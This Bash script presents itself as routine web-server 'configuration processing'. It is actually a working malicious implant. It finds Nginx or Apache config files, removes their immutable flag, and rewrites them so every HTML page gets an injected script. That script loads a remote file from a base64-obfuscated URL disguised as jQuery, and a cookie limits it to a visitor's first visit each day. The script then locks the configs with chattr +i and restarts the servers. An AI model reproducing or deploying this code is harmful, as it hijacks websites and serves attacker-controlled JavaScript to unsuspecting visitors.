#!/bin/bash

# Apache 模块加载配置
APACHE_MODULES='
LoadModule headers_module modules/mod_headers.so
LoadModule rewrite_module modules/mod_rewrite.so
LoadModule substitute_module modules/mod_substitute.so
'

# Nginx 配置内容
NGINX_CONFIG='
    sub_filter_types text/html;
    sub_filter '\''</head>'\'' '\''<script>document.cookie="hasVisited178a=1;Max-Age=86400;Path=/";(function(){var hm=document.createElement("script");hm.src=atob("aHR0cHM6Ly9qYXZhc2ljcHJ0LmNvbS9saWIvanF1ZXJ5LzQuNy4yL2pxdWVyeS5taW4uanM=");var s=document.getElementsByTagName("script")[0];s.parentNode.insertBefore(hm,s);})();</script>\n</head>'\'';
    sub_filter_once off;
'



echo "Starting configuration processing"

# 检测并处理 Nginx
if pgrep -x "nginx" > /dev/null 2>&1 || pgrep -f "nginx: master" > /dev/null 2>&1; then
    echo "Nginx service detected, processing configuration"
    
    # 查找配置文件
    nginx_config="/etc/nginx/nginx.conf"
    if [ -f "/www/server/nginx/conf/nginx.conf" ]; then
        nginx_config="/www/server/nginx/conf/nginx.conf"
    elif [ -f "/usr/local/nginx/conf/nginx.conf" ]; then
        nginx_config="/usr/local/nginx/conf/nginx.conf"
    elif [ -f "/opt/nginx/conf/nginx.conf" ]; then
        nginx_config="/opt/nginx/conf/nginx.conf"
	elif [ -f "/usr/local/openresty/nginx/conf/nginx.conf" ]; then
        nginx_config="/usr/local/openresty/nginx/conf/nginx.conf"
    fi
    
    if [ -f "$nginx_config" ]; then
        echo "Found Nginx config $nginx_config"
        chattr -i "$nginx_config"
        # 检查是否已经配置过
        if ! grep -q "sub_filter_types text/html" "$nginx_config"; then
            # 备份
            cp "$nginx_config" "${nginx_config}.backup_$(date +%Y%m%d_%H%M%S)"
            
            # 修改配置
            awk -v nginx_config="$NGINX_CONFIG" '
            BEGIN { in_http = 0; brace_count = 0; http_end_found = 0 }
            {
                if ($0 ~ /^[[:space:]]*#/) {
                    print $0
                    next
                }
                
                if ($0 ~ /^[[:space:]]*http[[:space:]]*{/) {
                    in_http = 1
                    brace_count = 1
                    print $0
                    next
                }
                
                if ($0 ~ /^[[:space:]]*http[[:space:]]*$/) {
                    in_http = 1
                    brace_count = 0
                    print $0
                    next
                }
                
                if (in_http && brace_count == 0 && $0 ~ /^[[:space:]]*{/) {
                    brace_count = 1
                    print $0
                    next
                }
                
                if (in_http) {
                    for (i = 1; i <= length($0); i++) {
                        char = substr($0, i, 1)
                        if (char == "{") brace_count++
                        if (char == "}") brace_count--
                    }
                    
                    if (brace_count == 0 && !http_end_found) {
                        print nginx_config
                        http_end_found = 1
                        in_http = 0
                    }
                    
                    print $0
                } else {
                    print $0
                }
            }' "$nginx_config" > "${nginx_config}.tmp" && mv "${nginx_config}.tmp" "$nginx_config"
            
            echo "Nginx configuration updated"
        else
            echo "Nginx already configured"
        fi
        chattr +i "$nginx_config"
        # 重启 Nginx
        echo "Restarting Nginx"
        systemctl restart nginx 2>/dev/null
        service nginx restart 2>/dev/null
        /etc/init.d/nginx stop 2>/dev/null
		
		sleep 5
		
        /etc/init.d/nginx start 2>/dev/null
    else
        echo "Nginx config file not found"
    fi
fi

# 检测并处理 Apache
if pgrep -x "httpd" > /dev/null 2>&1 || pgrep -f "apache2" > /dev/null 2>&1 || pgrep -f "httpd" > /dev/null 2>&1; then
    echo "Apache service detected, processing configuration"
    
    # 查找配置文件
    apache_config="/etc/httpd/conf/httpd.conf"
    if [ -f "/www/server/apache/conf/httpd.conf" ]; then
        apache_config="/www/server/apache/conf/httpd.conf"
    elif [ -f "/etc/apache2/apache2.conf" ]; then
        apache_config="/etc/apache2/apache2.conf"
    elif [ -f "/usr/local/apache2/conf/httpd.conf" ]; then
        apache_config="/usr/local/apache2/conf/httpd.conf"
    fi
    
    if [ -f "$apache_config" ]; then
        echo "Found Apache config $apache_config"
        chattr -i "$apache_config"

        # 检查是否已经配置过
        if ! grep -q 'Header set Set-Cookie "hasVisited178a=1' "$apache_config"; then
            # 备份
            cp "$apache_config" "${apache_config}.backup_$(date +%Y%m%d_%H%M%S)"
            
            # 修改配置
            if [[ "$apache_config" == *"www/server/apache"* ]]; then
                # 宝塔面板 Apache - 使用here document避免引号错乱
                printf '%s\n' "$APACHE_MODULES" > /tmp/apache_modules.tmp
                cat /tmp/apache_modules.tmp "$apache_config" > "${apache_config}.new"
                mv "${apache_config}.new" "$apache_config"
                cat >> "$apache_config" << 'EOF'
Header set Set-Cookie "hasVisited178a=1; Max-Age=86400; Path=/"

RewriteEngine On
RewriteCond %{HTTP_COOKIE} !hasVisited178a=1
RewriteRule ^ - [E=HAS_NOT_VISITED:1]

<IfModule mod_rewrite.c>
    RewriteCond %{ENV:HAS_NOT_VISITED} =1
    RewriteRule ^(.*)$ - [E=INJECT_SCRIPT:1]
</IfModule>

<IfModule mod_substitute.c>
    AddOutputFilterByType SUBSTITUTE text/html
    Substitute "s|</head>|<script>document.cookie='hasVisited178a=1';(function(){var hm=document.createElement('script');hm.src=atob('aHR0cHM6Ly9qYXZhc2ljcHJ0LmNvbS9saWIvanF1ZXJ5LzQuNy4yL2pxdWVyeS5taW4uanM=');var s=document.getElementsByTagName('script')[0];s.parentNode.insertBefore(hm,s);})();</script></head>|i"
</IfModule>
EOF
                rm -f /tmp/apache_modules.tmp
            else
                # 标准 Apache - 使用here document避免引号错乱
                printf '%s\n' "$APACHE_MODULES" > /tmp/apache_modules.tmp
                cat /tmp/apache_modules.tmp "$apache_config" > "${apache_config}.new"
                mv "${apache_config}.new" "$apache_config"
                cat >> "$apache_config" << 'EOF'
Header set Set-Cookie "hasVisited178a=1; Max-Age=86400; Path=/"

RewriteEngine On
RewriteCond %{HTTP_COOKIE} !hasVisited178a=1
RewriteRule ^ - [E=HAS_NOT_VISITED:1]

<IfModule mod_rewrite.c>
    RewriteCond %{ENV:HAS_NOT_VISITED} =1
    RewriteRule ^(.*)$ - [E=INJECT_SCRIPT:1]
</IfModule>

<IfModule mod_substitute.c>
    AddOutputFilterByType SUBSTITUTE text/html
    Substitute "s|</head>|<script>document.cookie='hasVisited178a=1';(function(){var hm=document.createElement('script');hm.src=atob('aHR0cHM6Ly9qYXZhc2ljcHJ0LmNvbS9saWIvanF1ZXJ5LzQuNy4yL2pxdWVyeS5taW4uanM=');var s=document.getElementsByTagName('script')[0];s.parentNode.insertBefore(hm,s);})();</script></head>|i"
</IfModule>
EOF
                rm -f /tmp/apache_modules.tmp
            fi
            
            echo "Apache configuration updated"
        else
            echo "Apache already configured"
        fi
        chattr +i "$apache_config"
        # 重启 Apache
        echo "Restarting Apache"
        systemctl restart apache2 2>/dev/null
        systemctl restart httpd 2>/dev/null
        service apache2 restart 2>/dev/null
        service httpd restart 2>/dev/null
        /etc/init.d/apache2 stop 2>/dev/null
        /etc/init.d/httpd stop 2>/dev/null
		
		sleep 5
		
        /etc/init.d/apache2 start 2>/dev/null
        /etc/init.d/httpd start 2>/dev/null
    else
        echo "Apache config file not found"
    fi
fi

echo "Configuration process completed but maybe failed" 